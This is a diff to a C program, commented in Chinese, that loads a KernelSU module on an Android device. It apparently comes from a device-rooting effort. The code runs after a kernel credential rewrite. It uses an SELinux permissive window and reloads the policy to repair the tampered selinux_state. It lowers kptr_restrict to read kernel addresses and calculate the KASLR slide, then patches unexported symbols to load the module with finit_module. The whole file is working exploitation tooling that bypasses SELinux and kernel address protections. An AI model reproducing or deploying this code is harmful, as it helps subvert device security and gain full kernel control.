@@ -1,21 +1,24 @@
 /*
  * c99491_load —— 单进程 KernelSU 模块加载器（B 方案核心）。
  *
- * 为什么不走 ksud：`ksud insmod` 要 exec 新进程，能力继承受
- * permitted/ambient 约束、报错不透明；而自己直接 finit_module 又因 KO
- * 有 225 个未导出符号而 ENOENT。因此本程序在**本进程内**：
- *   解析 KO symtab → 用离线表把未定义符号改成 SHN_ABS 且
- *   st_value = 链接期地址 + slide → memfd → finit_module。
+ * 实测结论链：
+ *   - cred 改写后 uid=0 且 CapPrm 含 SYSLOG+SYS_MODULE；
+ *   - Enforcing 下 finit_module 被 AVC 拒绝（denied { sys_module } capability=16）；
+ *   - permissive 窗口内 finit_module 可以成功；
+ *   - 但清零 selinux_state 前 8 字节会同时清掉 enforcing、initialized、
+ *     policycap[0..5]，只写回 enforcing 不足以恢复，系统数分钟后仍会重启；
+ *   - 解决办法：窗口内先重载运行策略（/sys/fs/selinux/policy → /load），
+ *     由内核重建 initialized 与 policycap；顺序必须在模块加载之前，
+ *     否则会冲掉模块注入的 ksu 域。
  *
- * slide 的三种来源（按序尝试）：
- *   1. --slide 参数
- *   2. /data/local/tmp/slide.txt（外部写入，如 slide_probe 的产物）
- *   3. 窗口内读 /proc/kallsyms 的 selinux_state
- *      —— 本机厂商内核在 kptr_restrict=2 时连 root 都读不到地址，
- *      所以读之前先把 kptr_restrict 置 0，读完恢复为 2。
- *
- * 前提（由 ctest 完成）：uid==0 且 CapPrm 含 CAP_SYSLOG(34)+CAP_SYS_MODULE(16)，
- * 并且 permissive 窗口已打开（enforce==0）。
+ * 完整顺序：
+ *   1. 等 cred（uid=0 且 CapPrm 含 SYSLOG+SYS_MODULE）
+ *   2. 等 permissive 窗口（enforce==0）
+ *   3. 重载策略（重建 initialized/policycap）
+ *   4. 求 slide（文件 / kallsyms / 参数）
+ *   5. 解析 KO symtab，用离线表把未定义符号改成 SHN_ABS + 绝对地址
+ *   6. memfd → finit_module
+ *   7. 恢复 enforce=1
  *
  * 用法：c99491_load [--slide 0x..] [--ko path] [--table path]
  * 日志：/data/local/tmp/c99491_load.log（每步 fsync）
@@ -37,6 +40,8 @@
 #define DEFAULT_TABLE "/data/local/tmp/ksu_syms.txt"
 #define SLIDE_FILE "/data/local/tmp/slide.txt"
 #define KPTR_PATH "/proc/sys/kernel/kptr_restrict"
+#define POLICY_PATH "/sys/fs/selinux/policy"
+#define LOAD_PATH "/sys/fs/selinux/load"
 #define MAX_SYMS 512
 #define SHN_UNDEF 0
 #define SHN_ABS 0xfff1
@@ -142,6 +147,50 @@ static int write_str(const char *path, const char *s)
 	return rc > 0 ? 0 : -1;
 }
 
+/* 重载运行中的策略：读 /sys/fs/selinux/policy 再写回 /sys/fs/selinux/load。
+ * 内核会据此重建 selinux_state 的 initialized 与 policycap。 */
+static int reload_policy(void)
+{
+	int in, out;
+	unsigned char *buf;
+	ssize_t total = 0, n;
+	int ok = -1;
+
+	in = open(POLICY_PATH, O_RDONLY);
+	if (in < 0) {
+		logf_("open policy failed errno=%d\n", errno);
+		return -1;
+	}
+	buf = malloc(4 * 1024 * 1024);
+	if (!buf) {
+		close(in);
+		logf_("policy malloc failed\n");
+		return -1;
+	}
+	while ((n = read(in, buf + total, 4 * 1024 * 1024 - (size_t)total)) > 0)
+		total += n;
+	close(in);
+	logf_("policy read=%ld bytes\n", (long)total);
+	if (total <= 0) {
+		free(buf);
+		return -1;
+	}
+
+	out = open(LOAD_PATH, O_WRONLY);
+	if (out < 0) {
+		logf_("open load failed errno=%d\n", errno);
+		free(buf);
+		return -1;
+	}
+	n = write(out, buf, (size_t)total);
+	logf_("policy write=%ld errno=%d (%s)\n", (long)n, errno, strerror(errno));
+	if (n == total)
+		ok = 0;
+	close(out);
+	free(buf);
+	return ok;
+}
+
 static unsigned long long table_lookup(const char *name)
 {
 	for (int i = 0; i < ntbl; i++)
@@ -174,7 +223,6 @@ static int load_table(const char *path)
 	return ntbl;
 }
 
-/* slide 来源 2：外部写的文件 */
 static unsigned long long slide_from_file(void)
 {
 	FILE *f = fopen(SLIDE_FILE, "r");
@@ -188,7 +236,6 @@ static unsigned long long slide_from_file(void)
 	return v;
 }
 
-/* slide 来源 3：窗口内读 kallsyms（先临时关掉 kptr_restrict） */
 static unsigned long long slide_from_kallsyms(void)
 {
 	unsigned long long link = table_lookup("selinux_state");
@@ -196,11 +243,8 @@ static unsigned long long slide_from_kallsyms(void)
 	int kptr = -1;
 	FILE *f;
 
-	if (!link) {
-		logf_("table 缺 selinux_state\n");
+	if (!link)
 		return 0;
-	}
-	/* 记录并临时置 0（本机厂商内核只认 kptr_restrict==0） */
 	{
 		FILE *k = fopen(KPTR_PATH, "r");
 
@@ -210,17 +254,9 @@ static unsigned long long slide_from_kallsyms(void)
 			fclose(k);
 		}
 	}
-	if (write_str(KPTR_PATH, "0") != 0)
-		logf_("写 kptr_restrict 失败 errno=%d\n", errno);
-
+	write_str(KPTR_PATH, "0");
 	f = fopen("/proc/kallsyms", "r");
-	if (!f) {
-		logf_("open kallsyms failed errno=%d\n", errno);
-		if (kptr >= 0)
-			write_str(KPTR_PATH, "2");
-		return 0;
-	}
-	{
+	if (f) {
 		char line[512], nm[256], type;
 
 		while (fgets(line, sizeof(line), f)) {
@@ -233,12 +269,10 @@ static unsigned long long slide_from_kallsyms(void)
 				break;
 			}
 		}
+		fclose(f);
 	}
-	fclose(f);
 	if (kptr >= 0)
 		write_str(KPTR_PATH, "2");
-
-	logf_("kallsyms selinux_state=%#llx link=%#llx\n", a, link);
 	return (a && a > link) ? a - link : 0;
 }
 
@@ -297,7 +331,10 @@ int main(int argc, char **argv)
 	}
 	logf_("enforce(window)=%d\n", enforce_now());
 
-	/* 3) 求 slide */
+	/* 3) 重建 SELinux 状态（必须在模块加载之前） */
+	logf_("reload_policy rc=%d\n", reload_policy());
+
+	/* 4) 求 slide */
 	if (!slide)
 		slide = slide_from_file();
 	if (slide)
@@ -311,7 +348,7 @@ int main(int argc, char **argv)
 		return 4;
 	}
 
-	/* 4) 读 KO 并打符号补丁 */
+	/* 5) 读 KO 并打符号补丁 */
 	fd = open(ko_path, O_RDONLY);
 	if (fd < 0) {
 		logf_("open ko failed errno=%d\n", errno);
@@ -374,6 +411,7 @@ int main(int argc, char **argv)
 		return 9;
 	}
 
+	/* 6) memfd + finit_module */
 	memfd = (int)syscall(SYS_memfd_create, "ksu", 0);
 	if (memfd < 0) {
 		logf_("memfd_create failed errno=%d\n", errno);
@@ -390,6 +428,7 @@ int main(int argc, char **argv)
 	logf_("finit_module rc=%d errno=%d (%s)\n", rc, errno, strerror(errno));
 	close(memfd);
 
+	/* 7) 恢复 Enforcing */
 	logf_("restore enforce rc=%d\n", set_enforce(1));
 	logf_("enforce_after=%d\n", enforce_now());
 	logf_("su_exists=%d\n", access("/system/bin/su", X_OK) == 0);
